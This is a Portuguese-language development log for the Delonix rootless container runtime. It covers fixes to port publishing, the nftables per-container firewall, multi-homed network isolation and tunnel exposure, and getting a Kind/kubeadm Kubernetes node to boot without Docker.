**O sintoma original (o browser) era o comportamento seguro por omissão, sem superfície de CLI.**
`slirp_add_hostfwd` liga sempre a `127.0.0.1` — correcto por omissão, mas a ÚNICA forma de o
alargar era a env var não documentada `DELONIX_PUBLISH_ADDR`, e `parse_publish` REJEITAVA a
sintaxe Docker `-p <ip>:<hp>:<cp>` como "invalid port". Um browser noutra máquina (ou o próprio
host pelo IP da LAN) recebia connection-refused sem nada a explicar porquê. **Corrigido**:
`parse_publish_addr` lê a forma `[hostIp:]hostPort:contPort[/proto]` e `publish_bind_addr`
concentra a precedência (spec > env > `127.0.0.1`) num só sítio, para os DOIS caminhos de publish
(slirp por-container e o slirp único do ingress) não divergirem. O default seguro fica intacto —
alargar é sempre opt-in explícito. Só IPv4 (é interpolado no JSON do api-socket do slirp; um
literal IPv6 também colidiria com a divisão por `:`); um head não-IPv4 é **recusado**, nunca
descartado em silêncio — que foi exactamente o bug do compose com `127.0.0.1:9000:80`.
**Validado ao vivo**: `-p 0.0.0.0:18099:80` → `ss` confirma bind em `0.0.0.0`, e
`curl http://192.168.1.106:18099/` → **200** (antes: spec recusada; com `8080:80`, `000` na LAN).

**Dívida registada aqui e FECHADA a 2026-07-28** (ver "Endurecimento do ingress/egress" abaixo):
`infra::publish_port_allow` (publish com allowlist de CIDRs ANTES do DNAT) tinha **zero
chamadores** — a mesma família de armadilha de `mount_live`/`set_net_rate`/`update_limits`. Foi
**apagado**, não ligado: o tráfego publicado chega todo com o gateway do slirp como origem, por
isso a allowlist não casaria com nada e o `!= { … } drop` teria dropado TUDO.

### `-p 80:80` respondia com o JSON cru do slirp (2026-07-27)

Bug report real: `container run --rm -p 80:80 nginx` →
``system call `slirp hostfwd` failed: port 80: {"error":{"desc":"bad request: add_hostfwd:
slirp_add_hostfwd failed"}}``. **Não é bug de dataplane** — o `add_hostfwd` do slirp faz o bind do
lado do HOST, como este mesmo utilizador não privilegiado, e uma porta abaixo de
`net.ipv4.ip_unprivileged_port_start` (1024) precisa de `CAP_NET_BIND_SERVICE`. A limitação já
estava documentada (é a razão de as auto-rotas do proxy L7 servirem em `:8080`), mas o utilizador
recebia JSON opaco **depois** do container já estar criado.

- **Preflight no `cmd_run`**, ao lado do erro de porta ocupada e no mesmo formato (facto primeiro,
  depois os comandos prontos a copiar: `-p 8080:80`, ou `sysctl -w ip_unprivileged_port_start=80`).
  Falha antes de criar seja o que for.
- **`delonix_net::can_bind_host_port`** decide por um **bind real**, não por comparação com o
  sysctl: o sysctl não é a regra toda (um binário com `CAP_NET_BIND_SERVICE` liga a 80 com ele
  intocado). `EADDRINUSE` **não** conta como falha — porta ocupada é outro diagnóstico, com erro
  próprio que nomeia o dono, e este check não lho pode roubar (coberto por teste).
- `slirp_add_hostfwd` passou a acrescentar a mesma explicação à mensagem quando a porta é
  privilegiada — os caminhos que não fazem preflight (ingress, compose, `container update
  --publish-add`, a API docker) aterram todos ali.

Validado ao vivo em EN e PT. Nota de teste: um `run` falhado com `--rm` deixou um `slirp4netns`
órfão a segurar a porta (o caso conhecido do `reap_orphan_slirp`, reapado no `run` seguinte) —
limpo à mão nesta sessão.

**Onde é que o utilizador baixa o limiar (decisão fechada, 2026-07-28).** O `install.sh --low-ports`
(commit `ec8f079`) já escrevia `/etc/sysctl.d/99-delonix-lowports.conf` — o que faltava era ser
DESCOBRÍVEL: não estava no `README.rst` (só nas notas da v0.36.1) e o erro acima mandava um `sysctl
-w` avulso, que não sobrevive ao reboot. Corrigido nos dois sítios (o erro aponta agora para o
instalador com a flag). **O default público mantém-se opt-in** — baixar a fronteira num host
partilhado/de produção deixa qualquer programa local ligar-se a 80-1023, e a alternativa que não
baixa nada é um proxy root na 80 a reencaminhar para uma porta alta.

**A golden VM rootless (`--no-k8s`) é a excepção e traz o sysctl JÁ aplicado**
(`rootless_customization_steps`): é uma VM descartável, de um só inquilino, cujo propósito inteiro
é correr Delonix rootless — o compromisso host-wide não tem ali significado. **A golden k8s NÃO o
leva** (o kubelet/kube-proxy desse nó já correm como root); por isso o passo fica no
`rootless_customization_steps` e não no `shared_account_steps`. Escrito como FICHEIRO em
`/etc/sysctl.d`, nunca `sysctl -w`: o `virt-customize` corre contra um convidado offline, só o que
fica em disco chega ao primeiro boot. Teste:
`so_a_golden_rootless_traz_as_portas_baixas_abertas` (as 3 distros levam-no, a golden k8s não).

### Varredura #2 do flow de comunicação (2026-07-27) — o IP primário como ponto cego

Continuação directa da revisão acima, a pedido do utilizador ("há mais algum bug de comunicação?").
Quatro achados novos, todos **reproduzidos ao vivo**. Três partilham UMA raiz: **todo o plano de
controlo assume que um container tem UM IP**. Multi-homing (`--net-connect`) dá-lhe um segundo, e
esse segundo é invisível para tudo o que devia governá-lo.

1. **ALTO (segurança) — a firewall por-container não governa as redes adicionais.**
   `apply_firewall(id, ip, fw)` recebia só `c.ip` e os jumps no `fwdeny` são
   `ip daddr <ip> jump fw<hash>` — o IP extra não tem jump nenhum, logo nunca entra na chain.
   **Ao vivo**: `ingress policy deny` em B → A→B pelo IP primário `blocked`; ligados os dois a uma
   2.ª rede, A→B pelo IP extra **REACHABLE**. `ingress`/`egress`/`Dependency` são todos
   contornáveis por multi-homing. **Corrigido** com `apply_firewall_all` (linha de controlo
   `firewall <id> <ip1,ip2,…> <hex>`) + `do_firewall` a emitir um corpo por IP e um par de jumps
   por IP. Com um só IP a linha fica byte-a-byte igual à antiga — um holder anterior continua a
   servir o caso single-homed, só a forma multi-IP exige o novo.
2. **ALTO (segurança) — o isolamento de namespace também é contornável por multi-homing.**
   `do_attach_extra` nunca chamava `ns_set_join`, ao contrário do `do_attach`: o IP extra fica
   fora de `@dlxall`/`@dlxns_<ns>`, e a regra de corte cross-namespace
   (`ip saddr @dlxall ct state new drop`) só dispara para fontes em `@dlxall`. **Ao vivo**:
   teamA↔teamB `blocked` pelos IPs primários, **REACHABLE** pelos extra. **Corrigido**: a linha
   `attach-extra` ganhou o token de namespace (6 tokens = `default`, 7 = namespaced — o mesmo
   padrão de compatibilidade que o `attach` já usava) e chama `ns_set_join`.
   **Corolário corrigido de caminho**: os jumps do `fwdeny` passaram a ser **reconstruídos** (não
   adicionados-se-faltarem). Um container que SAI de uma rede adicional deixava lá o jump do IP
   libertado, e o IPAM entrega esse IP a outro container mais tarde — o inquilino seguinte
   herdava em silêncio a firewall deste. `--net-connect`/`--net-disconnect` reaplicam agora a
   firewall.
3. **MÉDIO — as redes adicionais desapareciam num `stop`+`start`, em silêncio.** `cmd_start`
   reatacha só a rede primária; `c.extra_networks` está persistido mas nunca era reproduzido.
   **Ao vivo**: `eth1` presente antes, ausente depois, e o `describe` continuava a listar
   `Extra: dlx-dev2 (10.239.x on eth1)`. Um serviço alcançável só por essa 2.ª rede partia no
   primeiro restart, sem uma linha de aviso. É a MESMA família do `-v` que não era persistido
   (ver `cluster load`, acima) — mas ao contrário desse, aqui o estado ESTAVA guardado: faltava
   quem o replicasse. **Corrigido**: `cmd_start` reatacha cada `ExtraNet` (mesmo `id` no IPAM, por
   isso o IP volta igual; se voltar diferente, o registo é corrigido em vez de ficar a apontar
   para um endereço que já não existe). **Validado ao vivo**: `eth1` com o MESMO IP depois do
   restart.
4. **MÉDIO — o `unpublish` era cego ao protocolo, o `publish` não.** `-p 53:53/tcp` e
   `-p 53:53/udp` coexistem como duas publicações distintas, mas `slirp_remove_hostfwd` casava só
   por `host_port` e `do_unpublish` usava o needle `dport <n> ` — os dois derrubavam TUDO. Pior,
   `unpublish_live` removia UMA entrada do registo. **Ao vivo**: `--publish-rm 18100` deixou o
   registo a dizer `18100:53/tcp` com **zero** bindings no `ss` e `curl` a dar `000` — o registo a
   mentir sobre o dataplane, e a porta a ficar reservada no `port_owner` para um container que já
   não a serve. **Corrigido**: `slirp_remove_hostfwd_proto`/`do_unpublish(port, proto)`/
   `unpublish_port_proto` e o `unpublish_live` a remover TODAS as entradas daquele host port.
   **Validado ao vivo**: registo e `ss` passam ambos a vazio. (A forma de 2 tokens fica idêntica
   para o teardown, por compatibilidade com um holder anterior.)

**A lição transversal, que vale mais do que os quatro bugs**: `c.ip` não é "o endereço do
container" — é "o endereço na rede primária". Sempre que uma função de rede receber um único IP
vindo do registo, perguntar o que acontece com `extra_networks` não vazio. É a mesma classe da
armadilha já documentada do `container.userns` ("não é 'está num userns diferente do meu'") e do
`status()` por pidfile ("não é 'o holder é alcançável'").

**Nota de validação, importante para quem continuar**: os achados 1, 2 e metade do 4 corrigem
código que corre DENTRO do holder (`do_firewall`/`do_attach_extra`/`do_unpublish`). Este host tem
containers vivos (odoo, registries, control-planes k8s) e respawnar o holder derrubaria a SDN de
todos — por isso **os bugs foram provados ao vivo, mas as correcções desses três estão provadas
por teste unitário e leitura, não ao vivo**. Só tomam efeito num respawn do holder. Os achados 3 e
o lado-CLI do 4 correm no processo da CLI e estão validados ao vivo de ponta a ponta.

### Endurecimento do ingress/egress (2026-07-28) — o `policy deny` estava partido nos dois sentidos

Pedido: tornar o ingress/egress maduro ao nível do Docker/Podman. A revisão começou por uma
avaliação e acabou em correcções, porque o primeiro achado invalidava o subsistema inteiro.
**Todos os achados foram reproduzidos ao vivo primeiro, e todas as correcções validadas ao vivo
depois** (o holder estava DOWN com refcount 0 e sem redes — foi possível respawná-lo com o binário
novo sem derrubar nada, ao contrário das sessões anteriores).

1. **CRÍTICO — `policy deny` matava o tráfego legítimo, nos dois sentidos.** `ingress policy deny`
   tirava a saída ao PRÓPRIO container (DNS incluído); `egress policy deny` deixava um serviço
   publicado sem resposta (`curl` 200 → 000). Causa única: a política default emitia um
   `ip daddr <ip> drop`/`ip saddr <ip> drop` **sem `ct state`**, numa chain pendurada em
   `forward priority -10` — ANTES do `ct state established,related accept` do `forward`
   (priority 0). O tráfego de retorno nunca chegava a ver o accept. O isolamento de namespace, ao
   lado, já fazia a coisa certa (`ct state new drop`) — só a política ficou de fora. Consequência:
   "default-deny + allow explícito", a razão de existir do subsistema, era inexprimível.
   **Corrigido** com `fw_chain_prologue` (emitido UMA vez por chain, não por IP — o estado é do
   fluxo, não do endereço): `ct state invalid drop` + `ct state established,related accept`.
   **Efeito colateral a saber**: um `deny` explícito deixa de derrubar um fluxo JÁ estabelecido, só
   impede novos — é o que o iptables/nft/NetworkPolicy do k8s fazem, e é para isso que o
   `conntrack` (já uma dependência do instalador) existe. Validado ao vivo: com `ingress policy
   deny` a saída funciona E uma ligação nova de entrada continua bloqueada; com `egress policy
   deny` o publicado responde E a saída continua bloqueada.
2. **A aplicação da firewall não era atómica.** `do_firewall` era uma sequência de invocações
   separadas do `nft` (add chain → list → N× delete rule → 2×IPs add rule → e só então o
   flush+corpo). Cada uma é uma transação do kernel, por isso **entre apagar os jumps antigos e
   pôr os novos o container ficava sem firewall nenhuma** — janela aberta por qualquer
   `ingress deny`/`--net-connect`. Passou a **um único script `nft -f`**: o kernel aplica-o
   atomicamente e um erro de sintaxe deixa o ruleset anterior intacto em vez de meio-aplicado.
3. **Dispatch linear → verdict map.** O `fwdeny` levava **2 regras de jump por IP por container**;
   com os 49 containers que este host já teve, cada pacote percorria ~100 regras antes de chegar à
   sua. Agora há um `map fwmap { type ipv4_addr : verdict }` e uma chain própria **`fwcont`**
   (priority -5) com exactamente 2 regras (`ip daddr vmap @fwmap` / `ip saddr vmap @fwmap`),
   independentemente do número de containers. **A chain própria não é cosmética**: pôr as regras de
   dispatch no `fwdeny` deixaria a sua ordem relativa às regras de egress por-rede a depender da
   ORDEM DOS EVENTOS (que comando correu primeiro), não da intenção. Separadas, a política de
   egress da rede corre primeiro e continua autoritativa, e as regras por-container aplicam-se
   dentro dela (um `accept` não é terminal entre base chains, por isso um accept de rede nunca
   contorna a firewall do container). Confirmado ao vivo no `nft list chain ip dlxing fwcont`.
4. **`counter` em TODAS as regras + colunas PACKETS/BYTES no `ls`.** Não havia forma de responder a
   "esta regra alguma vez casou?" — metade do que uma firewall serve para dizer. `fw_rule_tail`
   (novo) é partilhado pelo GERADOR e pelo LEITOR: o tail é idêntico em todos os endereços de um
   container multi-homed, o que é exactamente o que permite somar os counters de uma regra ao longo
   das redes. Se os dois tivessem cópias próprias da formatação, o leitor deixava de casar em
   silêncio no dia em que o gerador mudasse um espaço. Validado ao vivo (`2 packets / 88 B` reais).
5. **IPv6 era uma armadilha, agora é recusa clara.** `fw_src_ok` aceitava CIDR v6 mas o dataplane é
   `table ip` (v4): o utilizador levava um dump cru do nft vindo do fundo do holder. Validador
   apertado para IPv4 + `check_cidr` (um só sítio para todos os pontos de entrada) a nomear o IPv6
   explicitamente. Suporte v6 a sério é tabela `inet` + SDN v6 — trabalho próprio, não um
   relaxamento de validador.
6. **Ranges de portas** (`-p 8000-8002:9000-9002`, sintaxe Docker) via `expand_publish_range`, que
   expande **na fronteira** — tudo a jusante (posse da porta, `unpublish`, o `ports` do registo)
   continua a ser por-porta-única, e é assim que deve ficar. Larguras diferentes são **recusadas**
   com a contagem dos dois lados, nunca truncadas em silêncio. Ligado ao `run` E ao
   `update --publish-add` (uma flag que funciona num sítio e não no outro é pior que nenhuma).
   Também apanhado: porta `0` e `70000` passavam no teste "só dígitos".
7. **`publish_port_allow`/`do_publish_allow`/`publish-allow` REMOVIDOS.** Zero chamadores desde
   sempre — e não podiam funcionar: todo o tráfego que chega por uma porta publicada traz o
   **gateway do slirp** como origem, por isso uma allowlist de CIDRs reais não casaria com nada e o
   `!= { … } drop` antes do DNAT teria dropado TUDO. Era a armadilha que esta base de código já
   levou três vezes (`mount_live`, `set_net_rate`, `update_limits`): pública, morta, a mutar estado
   partilhado, com o bug latente à espera do primeiro chamador.

**`delonix_net::SLIRP_GW` (`10.0.2.2`) — e a correcção de uma conclusão larga demais.** A primeira
medição desta sessão (cliente em `127.0.0.1`) viu `10.0.2.2` no log do nginx e daí concluiu-se que
o IP de origem NUNCA sobrevive ao hostfwd. **Errado, e corrigido no mesmo dia com três clientes em
vez de um**: `127.0.0.1` → `10.0.2.2`, mas `172.16.31.103` (LAN) e `192.168.122.1` (gateway
libvirt) chegam ao container **como eles próprios**. A libslirp não pode usar um endereço de
loopback como origem dentro da rede emulada — não há rota de volta — por isso substitui-o pelo
gateway; toda a origem roteável passa intacta. **Lição de método**: um único cliente de teste não
caracteriza um caminho de rede, e o cliente mais à mão (`localhost`) é precisamente o caso especial.

Consequências, todas confirmadas ao vivo: **a filtragem por origem FUNCIONA em portas publicadas**
(`policy deny` + `allow <porta> --from <cidr>` → origem permitida 200, outra origem 000), e o
rate-limit por-origem do `do_l4guard` separa clientes reais. A única excepção é o cliente loopback,
que não casa com uma regra escrita para um endereço real — o que importa saber é que testar uma
regra dessas com `curl localhost` falha por uma razão que nada tem que ver com a regra.

Três coisas ficaram erradas com o modelo correcto e foram corrigidas: (1) o `ingress ls` mostrava
`-` nos counters de uma regra `--from <ip>/32` com tráfego real — o kernel renderiza um prefixo de
host único como endereço nu, por isso o `/32` gerado nunca casava com a listagem; `fw_rule_tail`
passa a omiti-lo; (2) `published_verdict` (booleano) dizia **BLOCKED** a um publish restrito a uma
origem, com um aviso a afirmar "the port answers nothing" — falso exactamente na configuração mais
útil que existe (expor uma porta a uma só rede); passou a `published_reach` com três estados
(`Open`/`Sources`/`Blocked`); (3) a coluna FROM do publish, que esta sessão tinha acabado de mudar
para `10.0.2.2`, passou a mostrar as origens reais autorizadas, com a ressalva do loopback na nota.

E **`publish_port_allow` continua removido, mas por outra razão**: não é impossível, é
**redundante** — a chain por-container já faz filtragem por origem e fá-la bem. Dois mecanismos
paralelos para o mesmo trabalho, em chains diferentes com precedências diferentes, é como duas
respostas à mesma pergunta começam a divergir.

**Também continua em aberto** (não tocado nesta sessão): o `l4guard` só é alcançável por manifesto
(sem comando de CLI) e só é global; regras sem ordenação/prioridade explícita; sem `log prefix` por
regra; o isolamento não é reconstruído num respawn do holder; pods (CRI) e VMs ainda fora do
isolamento de namespace.

### `tunnel expose --provider pinggy` sem URL (v0.16.1)

Bug report real (host kaeso-sys-01): `delonix net tunnel expose --provider pinggy --local-port 8181`
respondia sempre "URL ainda não confirmada", nunca uma URL real. **Causa-raiz, confirmada
correndo o `ssh` real à mão, fora do binário**: `free.pinggy.io` (o endpoint DOCUMENTADO pela
pinggy) tem geo-DNS — a partir deste host resolvia sempre para um PoP regional partido
(`br.free.pinggy.io` → `lin.br.1.a.pinggy.click`) que aceita a ligação, aloca o `-R0`, e fecha
segundos depois sem imprimir nada. Um 2.º comportamento também reproduzido: sob `setsid`/detached
(exactamente como `spawn_and_capture` lança o processo), o `ssh` às vezes nem sai depois do
servidor fechar — fica pendurado. Nem "processo morreu" nem "processo vivo" isolam sozinhos qual
das duas falhas aconteceu. **Corrigido**: `spawn_pinggy` tenta `free.pinggy.io` primeiro (mantido
como omissão — é o documentado); se o poll não produzir URL nenhuma, mata o processo se ainda
estiver vivo (nunca deixa 2 túneis por `TunnelRecord`) e tenta uma vez `a.pinggy.io` (endpoint
próprio da pinggy, não documentado à parte, mas que ligou com sucesso nas mesmas condições).
`spawn_and_capture` também sai do poll assim que o processo morre, em vez de esperar sempre os
15s. Validado ao vivo: URL pública real devolvida (`https://….free.pinggy.net`), `curl` local E
à URL pública deram 200 — o túnel encaminha tráfego de verdade, não é só log-scraping.

## Cluster modo Kind sem Docker — investigação (GO/NO-GO)

Pedido: `delonix cluster` em modo `kind` (sem `kubeadm`) a funcionar **sem Docker instalado** —
`delonix` substituiria Docker/Podman como backend do `kind`. Antes de investir no shim de
compatibilidade Docker (grande — emulação de templates Go, `network create`, `run` com
`--publish`/`--tmpfs`/`--restart`/`--cgroupns`, `logs -f`), fez-se: (1) investigação empírica da
superfície real que o `kind` exige de um backend, (2) 2 bugs corrigidos em `delonix image pull`
que bloqueavam qualquer teste, (3) um spike de validação — a imagem `kindest/node` (systemd +
containerd aninhado) sequer arranca sob o nosso modelo de isolamento?

### Superfície capturada (referência para a fase do shim)

Investigação empírica (não suposição): `docker` real envolvido num wrapper que regista cada
invocação, com um `kind create cluster` real de ponta a ponta — **52 invocações capturadas**.
Comandos usados por um backend "docker": `info --format {{json .}}` (+ variantes `-f {{.Driver}}`,
`--format '{{json .SecurityOptions}}'`, `-f {{json .DriverStatus }}`), `ps -a --filter
label=io.x-k8s.kind.cluster=<n> --format {{.Names}}`, `inspect --type=image <ref>`, `pull <ref>`,
`network ls --filter=name=^kind$ --format={{.ID}}`, `network inspect bridge -f {{ index .Options
"com.docker.network.driver.mtu" }}`, `network create -d=bridge -o
com.docker.network.bridge.enable_ip_masquerade=true -o com.docker.network.driver.mtu=1500 --ipv6
--subnet <cidr> kind`, `run --name <n> --hostname <n> --label io.x-k8s.kind.role=... --privileged
--security-opt seccomp=unconfined --security-opt apparmor=unconfined --tmpfs /tmp --tmpfs /run
--volume /var --volume /lib/modules:/lib/modules:ro -e KIND_EXPERIMENTAL_CONTAINERD_SNAPSHOTTER
--detach --tty --label io.x-k8s.kind.cluster=<n> --net kind --restart=on-failure:1 --init=false
--cgroupns=private --publish=127.0.0.1:<porta>:6443/TCP -e KUBECONFIG=... <imagem>`, `logs -f
<n>`, `inspect --format {{ index .Config.Labels "io.x-k8s.kind.role"}} <n>`, `exec --privileged
[-i] <n> <cmd>` (repetido para `cat`/`mkdir`/`cp /dev/stdin`/`kubeadm init`/`kubectl ...`),
`inspect -f {{range .NetworkSettings.Networks}}{{.IPAddress}},{{.GlobalIPv6Address}}{{end}} <n>`,
`inspect --format {{ with (index (index .NetworkSettings.Ports "6443/tcp") 0) }}{{ printf "%s\t%s"
.HostIp .HostPort }}{{ end }} <n>`, `rm -f -v <n>`.

Templates Go usados pelo `kind` são um conjunto **finito e conhecido** (capturado acima) — a fase
do shim pode emular por **correspondência exacta das strings**, sem motor de templates Go em Rust.

### 2 bugs corrigidos em `delonix image pull` (`crates/delonix-image/src/registry.rs`)

1. **`parse_reference` não tratava `repo:tag@digest`** (formato combinado, usado pela própria
   referência `kindest/node:v1.34.0@sha256:...`) — o ramo `@` cortava a referência sem primeiro
   remover a tag do lado do `repo`, produzindo uma URL de manifesto malformada. Testes de
   regressão: `parses_repo_tag_and_digest_combined`, `parses_repo_tag_and_digest_combined_com_registo_explicito`.
2. **Timeout de 120s demasiado curto** em `registry_client`/`pull_from_registry_with_creds` —
   `kindest/node` tem layers de várias centenas de MB; o `reqwest` cortava a leitura do corpo a
   meio, reportado como `"error decoding response body"` (não é erro de parsing, é leitura
   interrompida). Subido para 600s, alinhado com `push_to_registry`/`push_oci_artifact`.

Confirmado com um smoke test real: `delonix image pull kindest/node:v1.34.0@sha256:...` completa
em ~2min (antes falhava sempre, nos dois bugs).

### Spike GO/NO-GO: `container run --privileged` — resultado: **NO-GO nesta v1**

Achado inesperado antes mesmo do spike: o motor **já tem** lógica dedicada de delegação de
cgroup2 para nodes Kind (`setup_node_cgroup_ns` em `crates/delonix-runtime/src/lib.rs`), activada
quando `--privileged` + uma label `io.x-k8s.kind.*` está presente — trabalho não documentado
antes desta sessão. Para a poder exercitar, adicionou-se uma flag `--label KEY=VAL` (repetível) a
`delonix container run` (`crates/delonix-runtime-bin/src/cmd/container.rs`) — não existia
nenhuma forma de definir labels via CLI, só internamente. Ficou como funcionalidade permanente
(expõe um campo já existente em `Container`, não é específico de Kind).

Com a label e `--privileged`, `kindest/node` **crasha sempre no mesmo ponto**, muito cedo — logo
a seguir a `INFO: detected cgroup v1` no log do próprio entrypoint da imagem (que corre num host
100% cgroup v2, confirmado via `stat -fc %T /sys/fs/cgroup` → `cgroup2fs`). O crash reproduz-se
de forma idêntica em 3 condições diferentes:

1. `--privileged` sem a label Kind (cai no caminho `--privileged` genérico).
2. `--privileged` + label Kind, sessão rootless sem delegação systemd (motor avisa: "rootless SEM
   delegação de cgroup").
3. O mesmo, mas envolto em `systemd-run --user --scope -p Delegate=yes` (delegação pedida
   explicitamente) — **não muda o resultado**.
4. Mesmo com `command` sobreposto para `sleep infinity` — não isola nada, porque `--entrypoint`
   não existe no CLI hoje: `compose_command` mantém sempre o `ENTRYPOINT` da imagem
   (`/usr/local/bin/entrypoint /sbin/init`) e só a cauda muda, então o script do `kind` corre de
   qualquer forma.

**Causa-raiz não isolada com 100% de confiança** (precisa da próxima sessão): o log mostra
"detected cgroup v1" — misdetecção, já que o host é v2-only — e o script morre logo a seguir,
silenciosamente (sem stack trace; o `Container` também não guarda exit code hoje, gap a
corrigir). Hipótese mais provável: `/sys/fs/cgroup/cgroup.controllers` não está visível/válido
de dentro do mount+userns do nosso container no momento em que o script de deteção do `kind`
corre, levando-o a um caminho de cgroup v1 legado que depois falha contra um kernel só-v2. Para
confirmar: precisa de um `--entrypoint` override no CLI para correr o entrypoint do
`kindest/node` manualmente com `set -x`, ou copiar/editar o script para instrumentação.
**Actualização (sessão -p/paridade)**: `--entrypoint` JÁ EXISTE no CLI (`cmd_run`, semântica
docker, `""` limpa), e a causa-raiz provável foi corrigida no motor (fallback bind do /sys do
host quando montar sysfs novo dá EPERM em `--privileged --net host`, + mountpoint do cgroup2
criado pós-pivot_root — ver commit `dfe7e0b`). Revalidação do boot do `kindest/node` pendente.

**RESOLVIDO — a deteção de cgroup já não é o bloqueio** (sessão -p/paridade, confirmado com
instrumentação real via `--entrypoint /bin/bash` + `set -x`). Com o fix do sysfs (`dfe7e0b`),
dentro do container `--privileged` o `/sys/fs/cgroup` é `cgroup2fs` com TODOS os controladores
(`cpuset cpu io memory hugetlb pids rdma misc dmem`, 41 entradas) — antes estava vazio. O
entrypoint do `kindest/node`, corrido sob `systemd-run --user --scope -p Delegate=yes`, imprime
agora **`INFO: detected cgroup v2`** (era "detected cgroup v1" + morte) e avança muito mais:
userns ✓, mounts shared ✓, cgroup v2 ✓, machine-id ✓, faking DMI "kind" ✓, iptables legacy.
Também se descobriu, pelo caminho, um **deadlock corrigido**: em modo console (`privileged +
detach + log_path`), se o init morre antes de enviar o master do pty e um neto reparentado
segura o socketpair, o `run` pendurava PARA SEMPRE sem log — `recv_fd` ganhou `SO_RCVTIMEO` 10s.

**RESOLVIDO — netfilter já não é o bloqueio** (loop /loop netfilter). Causa isolada: com um netns
PRÓPRIO (owned pelo userns do container, i.e. `CLONE_NEWNET` e NÃO `--net host`), `CAP_NET_ADMIN`
é efectivo e o backend **nft funciona** (`nft add table`, `iptables-nft -L/-A` todos OK). O
backend **legacy NÃO**: lê `/proc/net/ip_tables_names`, um ficheiro `0440` do root do HOST que no
nosso userns aparece com dono não-mapeado (nobody) → EPERM (o próprio host, como não-root, também
não o lê). O `select_iptables()` do entrypoint do Kind conta linhas de `iptables-legacy-save` vs
`iptables-nft-save`; num netns fresco ambos dão 0 e o empate (`legacy >= nft`) cai para legacy —
o caminho partido. **Fix (`seed_kind_nft` em `container_init`, análogo a `mask_slow_node_units`)**:
para um nó Kind (`node_cgroup`), semeia UMA regra `iptables-nft -A INPUT -j ACCEPT` (inócua, ANTES
do `execve`, ainda com CAP_NET_ADMIN) → `iptables-nft-save` reporta ≥1 linha → o Kind escolhe nft.

**ESTADO ACTUAL — o `kindest/node` ARRANCA** (`run --privileged --detach --net none` sob
`systemd-run --user --scope -p Delegate=yes`, com os dois fixes: sysfs `dfe7e0b` + `seed_kind_nft`):
`detected cgroup v2` → `setting iptables to detected mode: nft` → `starting init` → `systemd 252
running in system mode` → `Welcome to Debian GNU/Linux 12` → dezenas de `Reached target`/`Started`
→ cria a `kubelet.slice`. Container fica **Running**. O NO-GO original (systemd+cgroup do node não
arranca) está **fechado**.

**Conectividade LIGADA + netfilter validado end-to-end** (loop netfilter, 2ª iteração). Com
`--net host -p 6443:6443` (netns próprio + slirp4netns — ver `cmd_run`, `new_netns` +
`slirp_attach`) o nó Kind arranca COM rede: `tap0` `10.0.2.100/24`, resolve `registry.k8s.io`
(outbound OK), `detected cgroup v2` → `iptables mode: nft` → systemd (0 unidades falhadas) →
**containerd `active`** (socket `/run/containerd/containerd.sock`). **`kubeadm init phase preflight`
PASSA** (RC=0) sem UM ERRO de netfilter/iptables — avança até ao pull de imagens. Warnings só de:
swap, cgroup `cpuset missing` (lacuna de delegação, ver abaixo), hostname `debuerreotype`. Os
sysctls de bridge estão activos no nó (`bridge-nf-call-iptables=1`, `ip_forward=1`). **Netfilter
está resolvido de ponta a ponta** para a carga real de k8s.

**Bug corrigido pelo caminho — `exec` largava caps em containers `--privileged`**: `runtime::exec`
usava `resolve_cap_keep` incondicionalmente (default KEPT_CAPS, sem CAP_NET_ADMIN), ignorando
`container.privileged` — ao contrário do init (`spawn`, `if privileged { all_caps_mask() }`).
Depurar netfilter por dentro (`nft`/`iptables` via `delonix container exec`) dava "Operation not
permitted" apesar de o init ter as caps. Corrigido: `exec` espelha o init (caps completas + seccomp
unconfined quando privileged). Confirmado: exec CapEff `1ffffffffff`, `nft` via exec OK.

### CLUSTER KUBERNETES REAL A CORRER — `kubeadm init` COMPLETO (2026-07-17)

Um control-plane Kubernetes v1.34 **Ready** sobre o Delonix, rootless, daemonless, **sem Docker**:

```
NAME   STATUS   ROLES           AGE   VERSION            CONTAINER-RUNTIME
kadm   Ready    control-plane   8m    v1.34.0            containerd://2.1.3
etcd / kube-apiserver / kube-controller-manager / kube-scheduler / kube-proxy / kindnet  →  todos 1/1 Running
```

Provas que interessam: o **kube-proxy programa netfilter** no nosso netns rootless (`nft list tables`
→ `table ip filter`, `table ip mangle`, `table ip nat`) e o nó regista-se com `INTERNAL-IP 10.0.2.100`.

**A receita que um nó Kind rootless EXIGE** (o `delonix cluster` tem de a gerar; nada disto é bug do
runtime — é config de kubelet/kube-proxy, e é exactamente o que o `kind` rootless também faz):
1. **`featureGates: { KubeletInUserNamespace: true }`** no `/var/lib/kubelet/config.yaml`. É O passo
   decisivo. Sem ele o kubelet morre em `open /dev/kmsg` — e o próprio kubelet diz a solução no log
   ("running in UserNS, Hint: enable KubeletInUserNamespace feature flag"). Tentar dar-lhe um
   `/dev/kmsg` NÃO resolve: um bind do kmsg do host é `root:adm 0640` (uid mapeado não abre) e um
   symlink para `/dev/console` só troca ENOENT por EIO. Com a gate, o kubelet ignora o kmsg.
2. **`--fail-swap-on=false`** no kubelet: um container herda o `/proc/swaps` do HOST — o fix de swap
   da imagem VM dourada (fstab) não se aplica aqui.
3. **`conntrack: { maxPerCore: 0, min: 0 }`** no ConfigMap do kube-proxy: `nf_conntrack_max` é um
   sysctl global, não escrevível de um userns (`permission denied` → CrashLoopBackOff).
4. CNI: o `/kind/manifests/default-cni.yaml` da imagem (kindnet) aplica-se tal e qual (só substituir
   `{{ .PodSubnet }}`); o nó passa a `Ready` ~1min depois.

**Aprendido pelo caminho (leaks de recursos — ver "Produção/HA")**: o kubelet aplicou a taint
`node.kubernetes.io/disk-pressure` porque **49 rootfs órfãos** (~45 GiB) de spikes anteriores tinham
enchido o disco a 89%. Directórios de container sobrevivem a mortes abruptas sem ninguém os reapar.

**Próximas fatias (já não netfilter)**: (1) cgroup `cpuset` na delegação (preflight marca-o
"missing required" — só WARNING, mas fecha-o para um nó limpo); (2) correr `kubeadm init` completo
até um control-plane Ready (o preflight já passa; falta exercitar o pull+init+CNI reais); (3)
`--net kind` rootless (setns) para nós na MESMA rede em vez de slirp isolado por nó. O shim Docker
continua depois destes, mas a fundação — cgroup + netfilter + systemd + containerd + rede — arranca.


### RESOLVIDO — as portas publicadas morriam sozinhas: era o `delonix-engine`, não o runtime (2026-07-17)

**Fechado.** Este bug queimou várias sessões porque o diagnóstico registado aqui estava ERRADO em
ambas as premissas: dizia que "as duas metades do `publish_port` falham em SILÊNCIO" e mandava
procurar quem chamava `unpublish_port`. Não falham, e não há chamador nenhum.

**Sintoma**: porta publicada serve HTTP 200 e ~10–16s depois dá `000`, com o container `Running` e
sem `stop`/`rm`.

